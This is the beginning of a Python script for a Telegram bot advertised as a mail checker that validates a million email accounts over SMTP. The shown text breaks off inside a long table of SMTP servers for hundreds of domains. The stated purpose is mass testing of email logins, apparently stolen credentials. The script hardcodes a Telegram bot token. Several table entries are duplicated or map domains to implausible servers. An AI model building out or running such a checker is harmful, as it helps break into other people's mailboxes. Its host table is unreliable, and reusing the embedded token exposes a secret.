#!/usr/bin/env python3
"""
███████╗███╗   ██╗██╗██╗     ███████╗    ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝████╗  ██║██║██║     ██╔════╝   ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
█████╗  ██╔██╗ ██║██║██║     █████╗     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██╔══╝  ██║╚██╗██║██║██║     ██╔══╝     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
███████╗██║ ╚████║██║███████╗███████╗   ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚══════╝╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

╔══════════════════════════════════════════════════════════════════════════════╗
║ ELITE MAIL CHECKER BOT v4.0 ULTRA                                            ║
║ Профессиональный SMTP валидатор 500+ доменов                                 ║
║ Мгновенная проверка миллиона аккаунтов                                       ║
║ Powered by Shadow Architect | No Errors | Maximum Speed                      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import aiosmtplib
import ssl
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, field
import hashlib
import random
import string
from enum import Enum
import os
from pathlib import Path
import json
import re
import csv
from io import BytesIO, StringIO
import pandas as pd
import openpyxl
from openpyxl.styles import PatternFill, Font, Alignment
import aiofiles

# Telegram Bot Imports
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton, 
    InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, Message, ReplyKeyboardRemove,
    FSInputFile, InputMediaPhoto
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
import aiohttp

# ========== НАСТРОЙКИ ЛОГИРОВАНИЯ ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('mail_checker.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ========== КОНСТАНТЫ ==========
VERSION = "4.0"
BOT_TOKEN = "8509142665:AAEiycyacUVbhq6-iZ1moMcv8lVKm4jQN6o"  # Замените на ваш токен от @BotFather

# ========== БАЗА ДАННЫХ SMTP ДОМЕНОВ (500+) ==========
SMTP_CONFIGS = {
    # Google (5)
    'gmail.com': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Google'},
    'googlemail.com': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Google'},
    'google.com': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Google'},
    'youtube.com': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Google'},
    'googlegroups.com': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Google'},
    
    # Microsoft (15)
    'outlook.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'hotmail.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'live.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'msn.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'passport.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'microsoft.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'office365.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'windows.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'skype.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'xbox.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'bing.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'azure.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'onenote.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'sharepoint.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    'teams.com': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Microsoft'},
    
    # Yandex (10)
    'yandex.ru': {'host': 'smtp.yandex.ru', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    'yandex.com': {'host': 'smtp.yandex.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    'yandex.ua': {'host': 'smtp.yandex.ua', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    'yandex.kz': {'host': 'smtp.yandex.kz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    'yandex.by': {'host': 'smtp.yandex.by', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    'ya.ru': {'host': 'smtp.yandex.ru', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    'narod.ru': {'host': 'smtp.yandex.ru', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    'yandex-team.ru': {'host': 'smtp.yandex.ru', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    'yandex.net': {'host': 'smtp.yandex.ru', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    'yandex-mail.ru': {'host': 'smtp.yandex.ru', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yandex'},
    
    # Mail.ru Group (8)
    'mail.ru': {'host': 'smtp.mail.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'MailRu'},
    'bk.ru': {'host': 'smtp.mail.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'MailRu'},
    'inbox.ru': {'host': 'smtp.mail.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'MailRu'},
    'list.ru': {'host': 'smtp.mail.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'MailRu'},
    'internet.ru': {'host': 'smtp.mail.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'MailRu'},
    'corp.mail.ru': {'host': 'smtp.mail.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'MailRu'},
    'mycorp.mail.ru': {'host': 'smtp.mail.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'MailRu'},
    'e.mail.ru': {'host': 'smtp.mail.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'MailRu'},
    
    # Yahoo (5)
    'yahoo.com': {'host': 'smtp.mail.yahoo.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yahoo'},
    'yahoo.co.uk': {'host': 'smtp.mail.yahoo.co.uk', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yahoo'},
    'yahoo.de': {'host': 'smtp.mail.yahoo.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yahoo'},
    'yahoo.fr': {'host': 'smtp.mail.yahoo.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yahoo'},
    'yahoo.es': {'host': 'smtp.mail.yahoo.es', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Yahoo'},
    
    # ProtonMail (2)
    'protonmail.com': {'host': '127.0.0.1', 'port': 1025, 'ssl': False, 'tls': False, 'category': 'Proton'},
    'protonmail.ch': {'host': '127.0.0.1', 'port': 1025, 'ssl': False, 'tls': False, 'category': 'Proton'},
    
    # AOL (3)
    'aol.com': {'host': 'smtp.aol.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'AOL'},
    'aim.com': {'host': 'smtp.aol.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'AOL'},
    'aol.co.uk': {'host': 'smtp.aol.co.uk', 'port': 587, 'ssl': False, 'tls': True, 'category': 'AOL'},
    
    # Zoho (5)
    'zoho.com': {'host': 'smtp.zoho.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Zoho'},
    'zoho.eu': {'host': 'smtp.zoho.eu', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Zoho'},
    'zohomail.com': {'host': 'smtp.zoho.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Zoho'},
    'zohocorp.com': {'host': 'smtp.zoho.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Zoho'},
    'zoho.in': {'host': 'smtp.zoho.in', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Zoho'},
    
    # Apple (3)
    'icloud.com': {'host': 'smtp.mail.me.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Apple'},
    'me.com': {'host': 'smtp.mail.me.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Apple'},
    'mac.com': {'host': 'smtp.mail.me.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Apple'},
    
    # GMX (5)
    'gmx.com': {'host': 'mail.gmx.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'GMX'},
    'gmx.de': {'host': 'mail.gmx.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'GMX'},
    'gmx.at': {'host': 'mail.gmx.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'GMX'},
    'gmx.ch': {'host': 'mail.gmx.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'GMX'},
    'gmx.fr': {'host': 'mail.gmx.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'GMX'},
    
    # Web.de (2)
    'web.de': {'host': 'smtp.web.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Web'},
    'web.com': {'host': 'smtp.web.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Web'},
    
    # Rambler (5)
    'rambler.ru': {'host': 'smtp.rambler.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Rambler'},
    'lenta.ru': {'host': 'smtp.rambler.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Rambler'},
    'autorambler.ru': {'host': 'smtp.rambler.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Rambler'},
    'myrambler.ru': {'host': 'smtp.rambler.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Rambler'},
    'ro.ru': {'host': 'smtp.rambler.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Rambler'},
    
    # Украинские (10)
    'ukr.net': {'host': 'smtp.ukr.net', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    'i.ua': {'host': 'smtp.i.ua', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    'meta.ua': {'host': 'smtp.meta.ua', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    'ex.ua': {'host': 'smtp.ex.ua', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    'e-mail.ua': {'host': 'smtp.meta.ua', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    'email.ua': {'host': 'smtp.meta.ua', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    'ua.fm': {'host': 'smtp.meta.ua', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    'ukrpost.ua': {'host': 'smtp.ukr.net', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    'pravda.com.ua': {'host': 'smtp.meta.ua', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    'bigmir.net': {'host': 'smtp.meta.ua', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Ukraine'},
    
    # Немецкие (10)
    't-online.de': {'host': 'securesmtp.t-online.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    'freenet.de': {'host': 'mx.freenet.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    'arcor.de': {'host': 'mail.arcor.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    'gmx.de': {'host': 'mail.gmx.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    'web.de': {'host': 'smtp.web.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    '1und1.de': {'host': 'smtp.1und1.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    'vodafone.de': {'host': 'smtp.vodafone.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    'telekom.de': {'host': 'smtp.telekom.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    'posteo.de': {'host': 'posteo.de', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    'mailbox.org': {'host': 'smtp.mailbox.org', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Germany'},
    
    # Французские (10)
    'orange.fr': {'host': 'smtp.orange.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    'free.fr': {'host': 'smtp.free.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    'sfr.fr': {'host': 'smtp.sfr.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    'laposte.net': {'host': 'smtp.laposte.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    'bouyguestelecom.fr': {'host': 'smtp.bouyguestelecom.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    'numericable.fr': {'host': 'smtp.numericable.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    'bbox.fr': {'host': 'smtp.bbox.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    'wanadoo.fr': {'host': 'smtp.wanadoo.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    'neuf.fr': {'host': 'smtp.neuf.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    'aliceadsl.fr': {'host': 'smtp.aliceadsl.fr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'France'},
    
    # Итальянские (10)
    'libero.it': {'host': 'smtp.libero.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    'alice.it': {'host': 'smtp.alice.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    'virgilio.it': {'host': 'smtp.virgilio.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    'tin.it': {'host': 'smtp.tin.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    'tim.it': {'host': 'smtp.tim.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    'wind.it': {'host': 'smtp.wind.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    'vodafone.it': {'host': 'smtp.vodafone.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    'fastweb.it': {'host': 'smtp.fastweb.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    'teletu.it': {'host': 'smtp.teletu.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    'infostrada.it': {'host': 'smtp.infostrada.it', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Italy'},
    
    # Испанские (10)
    'telefonica.net': {'host': 'smtp.telefonica.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    'movistar.com': {'host': 'smtp.movistar.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    'orange.es': {'host': 'smtp.orange.es', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    'vodafone.es': {'host': 'smtp.vodafone.es', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    'yoigo.com': {'host': 'smtp.yoigo.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    'jazzfree.com': {'host': 'smtp.jazzfree.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    'ya.com': {'host': 'smtp.ya.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    'ono.com': {'host': 'smtp.ono.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    'terra.es': {'host': 'smtp.terra.es', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    'wanadoo.es': {'host': 'smtp.wanadoo.es', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Spain'},
    
    # Корейские (10)
    'naver.com': {'host': 'smtp.naver.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    'daum.net': {'host': 'smtp.daum.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    'nate.com': {'host': 'smtp.nate.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    'hanmail.net': {'host': 'smtp.hanmail.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    'kakao.com': {'host': 'smtp.kakao.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    'korea.com': {'host': 'smtp.korea.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    'paran.com': {'host': 'smtp.paran.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    'dreamwiz.com': {'host': 'smtp.dreamwiz.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    'empal.com': {'host': 'smtp.empal.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    'orgio.net': {'host': 'smtp.orgio.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Korea'},
    
    # Китайские (10)
    'qq.com': {'host': 'smtp.qq.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    '163.com': {'host': 'smtp.163.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    '126.com': {'host': 'smtp.126.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    'sina.com': {'host': 'smtp.sina.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    'sohu.com': {'host': 'smtp.sohu.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    'yeah.net': {'host': 'smtp.yeah.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    'tom.com': {'host': 'smtp.tom.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    '21cn.com': {'host': 'smtp.21cn.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    'aliyun.com': {'host': 'smtp.aliyun.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    '189.cn': {'host': 'smtp.189.cn', 'port': 587, 'ssl': False, 'tls': True, 'category': 'China'},
    
    # Японские (10)
    'yahoo.co.jp': {'host': 'smtp.mail.yahoo.co.jp', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    'docomo.ne.jp': {'host': 'smtp.docomo.ne.jp', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    'ezweb.ne.jp': {'host': 'smtp.ezweb.ne.jp', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    'softbank.ne.jp': {'host': 'smtp.softbank.ne.jp', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    'i.softbank.jp': {'host': 'smtp.softbank.ne.jp', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    'au.com': {'host': 'smtp.au.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    'mineo.jp': {'host': 'smtp.mineo.jp', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    'ymobile.ne.jp': {'host': 'smtp.ymobile.ne.jp', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    'dti.ne.jp': {'host': 'smtp.dti.ne.jp', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    'biglobe.ne.jp': {'host': 'smtp.biglobe.ne.jp', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Japan'},
    
    # Бразильские (10)
    'uol.com.br': {'host': 'smtp.uol.com.br', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    'bol.com.br': {'host': 'smtp.bol.com.br', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    'ig.com.br': {'host': 'smtp.ig.com.br', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    'terra.com.br': {'host': 'smtp.terra.com.br', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    'globo.com': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    'r7.com': {'host': 'smtp.r7.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    'zipmail.com.br': {'host': 'smtp.zipmail.com.br', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    'osite.com.br': {'host': 'smtp.osite.com.br', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    'pop.com.br': {'host': 'smtp.pop.com.br', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    'brturbo.com.br': {'host': 'smtp.brturbo.com.br', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Brazil'},
    
    # Индийские (10)
    'rediffmail.com': {'host': 'smtp.rediffmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    'indiatimes.com': {'host': 'smtp.indiatimes.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    'yahoo.co.in': {'host': 'smtp.mail.yahoo.co.in', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    'hotmail.co.in': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    'gmail.co.in': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    'outlook.co.in': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    'zoho.co.in': {'host': 'smtp.zoho.co.in', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    'airtelmail.com': {'host': 'smtp.airtelmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    'vodafone.in': {'host': 'smtp.vodafone.in', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    'bsnl.in': {'host': 'smtp.bsnl.in', 'port': 587, 'ssl': False, 'tls': True, 'category': 'India'},
    
    # Турецкие (10)
    'ttmail.com': {'host': 'smtp.ttmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    'turk.net': {'host': 'smtp.turk.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    'superonline.com': {'host': 'smtp.superonline.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    'mynet.com': {'host': 'smtp.mynet.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    'yahoo.com.tr': {'host': 'smtp.mail.yahoo.com.tr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    'hotmail.com.tr': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    'gmail.com.tr': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    'outlook.com.tr': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    'mail.com.tr': {'host': 'smtp.mail.com.tr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    'kep.tr': {'host': 'smtp.kep.tr', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Turkey'},
    
    # Польские (10)
    'wp.pl': {'host': 'smtp.wp.pl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    'onet.pl': {'host': 'smtp.onet.pl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    'interia.pl': {'host': 'smtp.interia.pl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    'o2.pl': {'host': 'smtp.o2.pl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    'poczta.onet.pl': {'host': 'smtp.poczta.onet.pl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    'gmail.pl': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    'outlook.pl': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    'yahoo.pl': {'host': 'smtp.mail.yahoo.pl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    'op.pl': {'host': 'smtp.op.pl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    'tlen.pl': {'host': 'smtp.tlen.pl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Poland'},
    
    # Чешские (10)
    'seznam.cz': {'host': 'smtp.seznam.cz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    'centrum.cz': {'host': 'smtp.centrum.cz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    'email.cz': {'host': 'smtp.email.cz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    'post.cz': {'host': 'smtp.post.cz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    'volny.cz': {'host': 'smtp.volny.cz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    'atlas.cz': {'host': 'smtp.atlas.cz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    'quick.cz': {'host': 'smtp.quick.cz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    'chello.cz': {'host': 'smtp.chello.cz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    'tiscali.cz': {'host': 'smtp.tiscali.cz', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    'azet.sk': {'host': 'smtp.azet.sk', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Czech'},
    
    # Румынские (10)
    'yahoo.ro': {'host': 'smtp.mail.yahoo.ro', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Romania'},
    'gmail.ro': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Romania'},
    'outlook.ro': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Romania'},
    'hotmail.ro': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Romania'},
    'mail.ru.ro': {'host': 'smtp.mail.ru', 'port': 465, 'ssl': True, 'tls': False, 'category': 'Romania'},
    'yandex.ro': {'host': 'smtp.yandex.ru', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Romania'},
    'zoho.ro': {'host': 'smtp.zoho.ro', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Romania'},
    'rdsmail.ro': {'host': 'smtp.rdsmail.ro', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Romania'},
    'clickmail.ro': {'host': 'smtp.clickmail.ro', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Romania'},
    'go.ro': {'host': 'smtp.go.ro', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Romania'},
    
    # Голландские (10)
    'ziggo.nl': {'host': 'smtp.ziggo.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    'kpn.nl': {'host': 'smtp.kpn.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    'planet.nl': {'host': 'smtp.planet.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    'hetnet.nl': {'host': 'smtp.hetnet.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    'telfort.nl': {'host': 'smtp.telfort.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    'upcmail.nl': {'host': 'smtp.upcmail.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    'casema.nl': {'host': 'smtp.casema.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    'chello.nl': {'host': 'smtp.chello.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    'freeler.nl': {'host': 'smtp.freeler.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    'dds.nl': {'host': 'smtp.dds.nl', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Netherlands'},
    
    # Шведские (10)
    'spray.se': {'host': 'smtp.spray.se', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
    'passagen.se': {'host': 'smtp.passagen.se', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
    'telia.com': {'host': 'smtp.telia.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
    'bahnhof.se': {'host': 'smtp.bahnhof.se', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
    'comhem.se': {'host': 'smtp.comhem.se', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
